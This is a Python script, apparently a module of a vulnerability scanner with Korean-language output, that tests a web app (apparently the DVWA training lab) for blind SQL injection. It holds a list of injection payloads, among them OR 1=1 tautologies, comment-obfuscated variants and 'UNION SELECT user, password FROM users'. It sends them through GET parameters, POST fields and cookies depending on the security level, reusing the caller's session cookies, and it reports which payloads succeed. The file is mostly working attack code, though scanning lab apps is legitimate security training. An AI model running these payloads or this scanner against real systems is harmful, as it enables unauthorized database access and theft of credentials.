import requests
from bs4 import BeautifulSoup
from urllib.parse import quote_plus
from rich.console import Console
from rich.table import Table

console = Console()

def run(soup, headers, find_path_dic, security_level):
    blind_payload = [
        "1'OR'1'='1",
        "3253252352",
        "1'UNION SELECT database(),user()%23",
        "1'/**/OR/**/1=1%23",
        "1 UNION SELECT user, password FROM users #",
        "3452523",
        "\"' AND '\"",
        "1' AND 1=1 --"
    ]

    raw_cookie = headers.get('Cookie', '')
    cookies = {}
    for pair in raw_cookie.split(';'):
        if '=' in pair:
            k, v = pair.strip().split('=', 1)
            cookies[k] = v

    result_tables = []

    for param_dic in find_path_dic:
        param_url = param_dic['url']
        param_method = param_dic['method'].upper()

        if 'sqli_blind' not in param_url:
            continue

        if param_method == "GET":
            for payload in blind_payload:
                encoded_payload = quote_plus(payload)
                pay_url = f"{param_url}?"

                for param in param_dic['param']:
                    if param.lower() != 'submit':
                        pay_url += f"{param}={encoded_payload}&"
                pay_url += "Submit=Submit"

                try:
                    res = requests.get(pay_url, cookies=cookies)
                    if "User ID exists in the database." in res.text:
                        table = Table(show_lines=True)
                        table.add_column("항목", style="white", justify="center")
                        table.add_column("내용", style="white", justify="center")
                        table.add_row("URL", param_url)
                        table.add_row("VULN NAME", "SQL_Blind")
                        table.add_row("Payload", payload)
                        result_tables.append(table)
                except Exception as e:
                    print(f"[예외 발생] : {e}")

        elif param_method == "POST" and security_level == "medium":
            for payload in blind_payload:
                encoded_payload = quote_plus(payload)
                data = {}
                for param in param_dic['param']:
                    if param.lower() == 'submit':
                        data[param] = 'Submit'
                    else:
                        data[param] = payload

                try:
                    res = requests.post(param_url, data=data, cookies=cookies)
                    if "User ID exists in the database." in res.text:
                        table = Table(show_lines=True)
                        table.add_column("항목", style="white", justify="center")
                        table.add_column("내용", style="white", justify="center")
                        table.add_row("URL", param_url)
                        table.add_row("VULN NAME", "SQL_Blind")
                        table.add_row("Payload", payload)
                        result_tables.append(table)
                except Exception as e:
                    print(f"[예외 발생] : {e}")

        elif param_method == "POST" and security_level == "high":
            result_url = param_url.replace('cookie-input.php', '')

            for payload in blind_payload:
                encoded_payload = quote_plus(payload)

                try:
                    for param in param_dic['param']:
                        if param.lower() != 'submit':
                            cookies[param] = encoded_payload

                    res = requests.get(result_url, cookies=cookies)

                    if "User ID exists in the database." in res.text:
                        table = Table(show_lines=True)
                        table.add_column("항목", style="white", justify="center")
                        table.add_column("내용", style="white", justify="center")
                        table.add_row("URL", param_url)
                        table.add_row("VULN NAME", "SQL_Blind")
                        table.add_row("Payload", payload)
                        result_tables.append(table)
                except Exception as e:
                    print(f"[예외 발생] : {e}")

    if not result_tables:
        console.print("[!] 탐지된 SQL Blind Injection 취약점이 없습니다.", style="bold red")
        return "[!] 탐지된 SQL Blind Injection 취약점이 없습니다."

    console.print("\n[italic bold white]\n{:^60}\n[/italic bold white]".format("SQL Blind Injection 탐지 결과"))
    for table in result_tables:
        console.print(table)

    return "[✓] 탐지된 SQL Blind Injection 결과 출력 완료."
